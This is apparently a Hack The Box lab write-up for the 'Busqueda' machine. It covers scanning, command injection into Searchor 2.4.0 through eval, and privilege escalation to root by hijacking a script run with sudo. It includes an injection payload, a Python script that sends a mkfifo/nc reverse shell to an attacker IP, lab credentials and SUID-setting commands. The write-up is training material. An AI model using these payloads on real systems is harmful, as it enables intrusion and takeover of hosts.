+++
title = 'Busqueda'
date = 2024-08-24T16:50:47-04:00
draft = false
tags = ["linux"]
category = ["htb"]
summary = "HTB - Linux - Easy"
+++

# Enum
```bash
Host is up (0.015s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Find a hostname `searcher.htb`, adding to `/etc/hosts`

# 80 - HTTP


If we select apple as the engine and test as the search string, it presents an URL as shown below.


There's also an option for an auto redirect.

`Searchor 2.4.0`





https://github.com/ArjunSharda/Searchor/pull/130



---
# Foothold

*Exploit code*

Looking at one of the exploit links >> https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

Due to an eval call we should be able to execute system commands via the web application.

We can download the exploit script, set up a nc listener on our attacker box, then run the exploit to get a reverse shell OR we could look at the exploit code to see how it works and try to exploit the vulnerability manually.

Lets try option 2. 



The exploit builds a reverse shell payload and base64 encodes it, and an evil_cmd variable holding python code to run a python.system command. They then use a curl request to send a POST HTTP request to the server with parameters injecting the evil_cmd into the query variable.

This looks a lot simpler once we capture a request with burp suite.



A captured request to the server. We're going to inject python code into the query variable.

We can check to verify our syntax is correct by running the following python command:
`engine=Apple&query="',__import__('os').system('id'))#`



What this command is doing is a double quote, a single quote, and comma as formatting to break out of the expected input. Importing the python os library, running the os.system method, allowing us to run linux system commands like 'id'.

Looking at the response we see the application is running as user 'svc'.

Next we can create a reverse shell and try to get our foothold. A great tool for reverse shells is https://www.revshells.com/. We're going to want to base64 encode the payload to avoid any issues with formatting.



In this case I'll just be using a simple bash reverse shell, using the built in function to base64 encode the payload.


Don't forget to set up a listener.
nc -lnvp 8443

We can inject our encoded shell code within our python code, make sure to base64 decode it, and execute it with bash


Send the request and check your listener!

Awesome, we have a shell. We'll want to use some magic to get a full TTY to make our lives easier with tab complete.
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
#hit control z to background the shell
stty raw -echo ; fg ; reset
```




We can take this and write a quick python script to get a reverse shell.
```python
import requests

url = 'http://searcher.htb/search'

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://searcher.htb',
    'Connection': 'close',
    'Referer': 'http://searcher.htb/',
    'Upgrade-Insecure-Requests': '1'
}

#command = input("Enter the command to execute: ")
lhost = '10.10.14.2'
lport = '9002'
command = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ' + lhost + ' ' + lport + ' >/tmp/f'

data = {
    'engine': 'Google',
    'query': f"',exec(__import__('os').system('{command}')))#"
}

response = requests.post(url, headers=headers, data=data)

print(response.text)            
```


## Exploits


--- 
# PrivEsc

Now that we're on a stable shell on the box, lets start enumerating for priv escalation. My first step is usually to check to see where we landed and if we can find anything interesting. 


We immediately find a .git folder and a config file containing a username (cody), a potential password (jh1usoih2bkjaspwe92), and a new subdomain.



Checking /etc/passwd we don't see a cody user on the box. Ip information shows we're likely in a docker container running the application.



.git/config file with a cred. We also appear to be in a docker container based on ip info.
`cody:jh1usoih2bkjaspwe92`

We can add the subdomain to our /etc/hosts file and log in to it with the creds we found

This seems to be a rabbit hole as we can login as the user cody but don't find a way to escalate our privileges.

Lets just for some password reuse and check if the svc user uses the same password as cody.



Using the cred we found for cody, as we don't find a cody user on the box in the passwd file, we can try to check sudo privs for the `svc` user using the same password.





We can run `/usr/bin/python3 /opt/scripts/system-checkup.py *`


Checking file permissions for the script, we see it's owned by root and we do not have the ability to modify or view the code.


We'll likely have to look into the function of the script and arguments. Lets try docker-ps argument to list running containers.



We find two running containers, gitea and mysql. Since this command appears to function similar to "docker ps", we can guess the docker-inspect is similar to docker inspect.

We can review the syntax for docker inspect here >> https://docs.docker.com/reference/cli/docker/inspect/

We can use this command to dump the config of the container with the following command:
`sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{.Config}}' gitea`



`administrator:yuiu1hoiu4i5ho1uh`
We can then login try to login as the administrator user of the gitea instance on the web server.


Success! We get access to the gitea server as the administrator user and can review the contents of the scripts folder. 


The contents of system-checkup.py, the command we can execute with sudo privs, shows something interesting.

The full path isn't included when the script references `full-checkup.sh` meaning we can hijack `full-checkup.sh` with our own file in another directory. As we run the script via sudo, we should be able to get a root shell.

Instead of setting up another listener and attempting to get a root shell, lets try modifying a binary we know we can use to escalate privileges with. In this case, lets use /bin/bash to get root by changing the permissions of the binary.


We can change the perms for /bin/bash to SUID by creating a full-checkup.sh file with the following contents and making it executable within the tmp directory:
```
#!/bin/bash
chmod u+s /bin/bash
```

We then want to run the following command to execute our hijacked full-checkup.sh script.

`sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`

Next we use an simple command found on https://gtfobins.github.io/gtfobins/bash/#suid to get a root shell



And we're done, we see our euid=0 making us effectively root! We can go and grab the root flag, submit it, and call it a day.


## Exploits





